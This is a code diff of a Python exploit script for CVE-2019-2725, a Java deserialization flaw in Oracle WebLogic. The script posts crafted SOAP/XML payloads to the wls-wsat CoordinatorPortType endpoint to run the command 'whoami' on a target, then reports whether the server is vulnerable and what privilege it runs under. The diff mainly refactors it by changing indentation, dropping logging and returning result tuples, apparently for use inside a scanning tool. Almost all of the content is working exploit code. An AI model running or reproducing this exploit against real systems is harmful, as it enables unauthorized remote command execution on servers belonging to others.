@@ -8,24 +8,20 @@
 |_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
 
 '''
-import logging
 import sys
 import requests
 
-logging.basicConfig(filename='Weblogic.log',
-                    format='%(asctime)s %(message)s',
-                    filemode="w", level=logging.INFO)
 
 VUL=['CVE-2019-2725']
 
 def weblogic_10_3_6(ip):
-	headers = {
+    headers = {
     "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Content-Type":"text/xml",
     "cmd":"%s"%("whoami")
     }
-	body = """<?xml version="1.0" encoding="utf-8" ?>
+    body = """<?xml version="1.0" encoding="utf-8" ?>
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
     xmlns:wsa="http://www.w3.org/2005/08/addressing"
     xmlns:asy="http://www.bea.com/async/AsyncResponseService">
@@ -37,17 +33,17 @@ def weblogic_10_3_6(ip):
      </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body></soapenv:Body></soapenv:Envelope>"""
-	url="%s/wls-wsat/CoordinatorPortType"%(ip)
-	rsp = requests.post(url, data=body, verify=False, headers=headers)
-	return rsp.status_code,rsp.text
+    url="%s/wls-wsat/CoordinatorPortType"%(ip)
+    rsp = requests.post(url, data=body, verify=False, headers=headers)
+    return rsp.status_code,rsp.text
 
 def weblogic_12_1_3(ip):
-	headers = {
+    headers = {
     "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
     "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
     "Content-Type":"text/xml"
 }
-	body='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+    body='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
     <java>
     <class><string>org.slf4j.ext.EventData</string>
     <void>
@@ -101,29 +97,22 @@ def weblogic_12_1_3(ip):
     </work:WorkContext>
     </soapenv:Header>
     <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''%("whoami")
-	url="%s/wls-wsat/CoordinatorPortType"%(ip)
-	rsp = requests.post(url, data=body, verify=False, headers=headers)
-	return rsp.status_code,rsp.text
+    url="%s/wls-wsat/CoordinatorPortType"%(ip)
+    rsp = requests.post(url, data=body, verify=False, headers=headers)
+    return rsp.status_code,rsp.text
 
-def run(dip,dport,index):
-    ip = "http://{}:{}".format(dip, dport)
+def run(rip,rport):
+    ip = "http://{}:{}".format(rip, rport)
     if weblogic_10_3_6(ip)[0]==200:
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:{}'.format(weblogic_10_3_6(ip)[1].replace('whoami : \r\n','')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(weblogic_10_3_6(ip)[1].replace('whoami : \r\n','')))
+        return (1, '[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(rip + ':' + str(rport), VUL[0]))
     elif weblogic_12_1_3(ip)[0]==200:
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:{}'.format(weblogic_12_1_3(ip)[1].replace('whoami : \r\n', '')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(weblogic_12_1_3(ip)[1].replace('whoami : \r\n', '')))
+        return (1, '[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(rip + ':' + str(rport), VUL[0]))
     else:
-        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
-        print('[-]Target weblogic not detected {}'.format(VUL[index]))
+        return (0, '[-] [{}] weblogic not detected {}'.format(rip + ':' + str(rport), VUL[0]))
 
 
 
 if __name__ == '__main__':
     dip = sys.argv[1]
     dport = int(sys.argv[2])
-    run(dip,dport,0)
+    run(dip,dport)
